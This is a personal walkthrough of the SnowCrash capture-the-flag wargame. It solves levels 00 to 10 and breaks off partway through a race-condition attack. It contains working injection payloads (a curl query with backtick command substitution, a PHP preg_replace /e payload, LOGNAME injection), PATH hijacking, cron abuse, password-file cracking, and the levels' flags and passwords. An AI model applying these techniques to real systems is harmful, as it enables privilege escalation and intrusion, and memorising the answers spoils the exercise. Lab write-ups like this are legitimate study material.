Snowcrash IP: 192.168.57.3

## level00
pass: level00

home dir: empty
check /etc/passwd, flag00 password blank
find / -user flag00 2> /dev/null

user has access to 2 files containing text
`cdiiddwpgswtgt`

Looked for ciphers online or cryptographic solvers and found this one:
https://ctfs.github.io/resources/topics/cryptography/caesar-cipher/README.html
When running the brute force solver I found: `nottoohardhere`

	su flag00
	nottoohardhere
	getflag

> Check flag.Here is your token : `x24ti5gi3x0ol2eh4esiuxias`

## level01

home dir: empty
check /etc/passwd, flag01 has a visible password string

flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash

so next getting the passwd file to the vm and running a password cracker.

	scp -P 4242 level00@[SnowCrashIp]:/etc/passwd .

level00 password is level00
running `john ./passwd` returns a password for flag01: `abcdefg`

	su flag01
	abcdefg
	getflag

> Check flag.Here is your token : `f2av5il02puano7naaf6adaaf`

## level02

There is a level02.pcap file in the home directory.
PCAP are Packet Capture files. I send it to my mac to run wireshark on it.

	scp -P 4242 level02@192.168.57.3:~/level02.pcap .

`chmod 777 level02.pcap` change permissions to open on wireshark.

Following a package stream I find
Password: ft_wandr...NDRel.L0L

I open up hexdump and notice each point is 7f which is del in ascii. 
I keep looking a little more, try utf-8 and I find the password is: `ft_wandrNDRelL0L` where 7F is (del)

	su flag02
	ft_waNDReL0L 
	getflag

> Check flag.Here is your token : `kooda2puivaav1idi4f57q8iq`

## level03

home directory has an exec level03.
when I run it I get: 'Exploit me!'
My first thought was to hexdump the file. 
It's possible to get binary:

	xxd -b file

hex:

	xxd file

or hexdump:

	hexdump -C yourfile (hd is alias for hexdump -C) 

I also found I could use ltrace/strace to show captured library calls and signals.

Inside I found:
> system("/usr/bin/env echo Exploit me"Exploit me

Making my own echo file

	chmod 777 .
	echo 'getflag' > echo
	chmod +x echo

and adding to PATH before the original echo

	export PATH=.:$PATH
	./level03

> Check flag.Here is your token : `qi0maab88jeaj46qoumi7maus`

## level04

home dir has a perl file level04.pl

inside I see:
> localhost:4747

use CGI qw{param}; // CGI is Common Gateway Interface, a webserver for script exchange.
Inside I see it can take a parameter 'x'
so I can run:

	curl 'localhost:4747?x=`getflag`'

> Check flag.Here is your token : `ne2searoevaevoem4ov4ar8ap`

## level05

Upon login received:
You have new mail.

home dir empty

	cat /var/mail/level05

outputs:
> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

The syntax is from chrontab and it's saying this is executed every 2 minutes, the command will log into flag05 and execute `sh /usr/sbin/openarenaserver`

	level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
	#!/bin/sh

	for i in /opt/openarenaserver/* ; do
		(ulimit -t 5; bash -x "$i")
		rm -f "$i"
	done


It appears that every 2 min each file in /opt/openarenaserver will run `bash -x` executing the command

	echo "getflag > /tmp/flag" > /opt/openarenaserver/getflag

after waiting about a minute

	cat /tmp/flag
outputs:
> Check flag.Here is your token : viuaaale9huek52boumoomioc

## level06

home dir has 2 files, an exec and a php file.
I use https://beautifytools.com/php-beautifier.php to beautify the php file because it is unreadable

	#!/usr/bin/php
	<?php
	function y($m)
	{
		$m = preg_replace("/\./", " x ", $m);
		$m = preg_replace("/@/", " y", $m);
		return $m;
	}
	function x($y, $z)
	{
		$a = file_get_contents($y);
		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
		$a = preg_replace("/\[/", "(", $a);
		$a = preg_replace("/\]/", ")", $a);
		return $a;
	}
	$r = x($argv[1], $argv[2]);
	print $r;
	?>

some search about preg_replace in php showed there are many vulnerabilities in php built in handling of regex. http://www.madirish.net/402, 

/e is meant for execution and the code inside is replaced by the second string where y is the variable given to the function. I replace the function in $y with a call to getflag.

	echo '[x ${`getflag`}]' > /tmp/getflag
	./level06 /tmp/getflag

outputs:
> PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

## level07

home dir has an exec called level07
I did `objdump -d level07` to disassemble the binary and found `system@plt` which seems to be a system call in the function `main`, upon googling I find an exploit: 
https://github.com/Bretley/how2exploit_binary/blob/master/exercise-2/README.md
Following this I tried 

	gdb -q level07
	disas main

and find a more readable verion of main!

	objdump -d level07 | grep system

prints the system info info:

08048410 <system@plt>:
 804859a:	e8 71 fe ff ff       	call   8048410 <system@plt>


> ### gdb sidenote
Install/uninstall gdb-peda

	git clone https://github.com/longld/peda.git ~/peda
	echo "source ~/peda/peda.py" >> ~/.gdbinit

All the peda-gdb does is to modify the config file of gdb. This file is by default located at ~/.gdbinit.
use cat ~/.gdbinit can you peek how does peda do

Therefore, to go back to vanilla gdb, there are 2 solutions

	gdb --nx

This is a better way, since you may need peda someday

	rm -rf ~/.gdbinit

This will remove the config file of gdb, so what peda did will have no effect on your gdb now.

gdb
- info functions (prints functions)
- b*0x08048576 (breakpoint at 0x08048576)
- r (run)
- c (continue)
- p/x (print/execute)
- jump/next (next line)
- step (step)
- stepi (step into)
- x/s [ptr] (x/show)
- x/w [ptr] (x/write)

>endnote

I tried going down this road for a while without success and finally tried the ltrace command.
Simple ltrace showed me the following:

	getenv("LOGNAME")                                             = "level07"
	asprintf(0xbffff704, 0x8048688, 0xbfffff37, 0xb7e5ee55, 0xb7fed280) = 18
	system("/bin/echo level07 "level07
	<unfinished ...>

So now I check the env variable LOGNAME has the username "level07" and that the syscall executes echo to print the LOGNAME variable

	level07@SnowCrash:~$ echo $LOGNAME
	level07
	level07@SnowCrash:~$ export LOGNAME="`getflag`"
	level07@SnowCrash:~$ ./level07
	Check flag.Here is your token : `fiumuikeil55xe9cu4dood66h`

## level08

have 2 files in home. an exec and a token file.

when I run the exec it outputs:
> ./level08 [file to read]

so I try 
> ./level08 token
outputs:
>You may not access 'token'

I check the rights with ls -la and see token has rights only for user flag08. 

I run an ltrace on the exec and see the following:

	level08@SnowCrash:~$ ltrace ./level08
	__libc_start_main(0x8048554, 1, 0xbffff7a4, 0x80486b0, 0x8048720 <unfinished ...>
	printf("%s [file to read]\n", "./level08"./level08 [file to read]
	)                    = 25
	exit(1 <unfinished ...>
	+++ exited (status 1) +++

It's output is what I expected from running the exec not much else. I then try ltrace with the token as argument:

	level08@SnowCrash:~$ ltrace ./level08 token
	__libc_start_main(0x8048554, 2, 0xbffff7a4, 0x80486b0, 0x8048720 <unfinished ...>
	strstr("token", "token")                                      = "token"
	printf("You may not access '%s'\n", "token"You may not access 'token'
	)                  = 27
	exit(1 <unfinished ...>
	+++ exited (status 1) +++

So it's checking if the argument contains the string "token" and if it does it prints "You may not access 'token'".
Since I don't have rights to `token` I can't copy or modify so I make a symbolic link

	level08@SnowCrash:~$ ln -s token tok
	level08@SnowCrash:~$ ls
	level08  tok  token
	level08@SnowCrash:~$ ./level08 tok
	quif5eloekouj29ke0vouxean
	level08@SnowCrash:~$ su flag08
	Password:
	Don't forget to launch getflag !
	flag08@SnowCrash:~$ getflag
	Check flag.Here is your token : `25749xKZ8L7DkSCwJkT9dyv6f`

## level09

Files in home. an exec and a token file.

When I run the exec `./level09 token` it outputs:
> tpmhr

I try `./level09 1111`
> 1234

So every next character increases by 1.
`ltrace ./level09`
outputs:
> `You should not try to reverse this`, so I reverse it. Every next character decreses by 1 in script.c

	#include <stdio.h>
	#include <stdlib.h>
	#include <unistd.h>
	#include <string.h>

	void	fn_sub(char *str) {
		char *new;
		int i;
		new = malloc(sizeof(char) * strlen(str) + 1);

		for (i = 0; i < strlen(str); i++)
			new[i] = str[i] - i;
		printf("%s\n", new);
	}

	int	main(int ac, char **av) {

		if (ac == 2)
			fn_sub(av[1]);
		write(1, "\n", 1);
		return (0);
	}

> gcc script.c -o decrypt

	level09@SnowCrash:~$ ./decrypt `cat token`
	f3iji1ju5yuevaus41q1afiuq

	level09@SnowCrash:~$ su flag09
	Password:
	Don't forget to launch getflag !
	flag09@SnowCrash:~$ getflag
	Check flag.Here is your token : `s5cAJpM8ev6XHw998pRWG728z`

## level10

Files in home: an exec and a token file.

When I run the exec `./level10 token` it outputs:

	./level10 file host
	sends file to host if you have access to it

I don't have access to `token` only user flag10 does. So I make a file I have access to to check output. 

	level10@SnowCrash:~$ echo "test" > /tmp/test
	level10@SnowCrash:~$ ./level10 /tmp/test localhost
	Connecting to localhost:6969 .. Unable to connect to host localhost

With `objdump -s ./level10` I can see the source (-s)
There is something interesting. "Connecting to %s:6969"
I check with `strings level10` and `gdb level10` -> info functions. To have a more readable output of the functions and strings in the binary.

	sends file to host if you have access to it
	Connecting to %s:6969 ..
	Unable to connect to host %s
	.*( )*.
	Unable to write banner to host %s
	Connected!
	Sending file ..
	Damn. Unable to open file

After much research I found that access() has an exploit. Between trying access and opening the file there is a race condition where we can change the file. 
The pair of access(2) and open(2) system calls is not a single, atomic operation. So I can change the file system in between the two system calls, to trick a setuid program into opening a file that it should not.
It's called a TOCTOU race (Time of Check to Time of Update)
It's best to use faccessat() or fstat() instead of access() ;) 
// netcat cheatsheet https://www.varonis.com/blog/netcat-commands

The next part will require 3 terminals. One to run an infinite loop on ./access.sh which will compare the access of read_file 
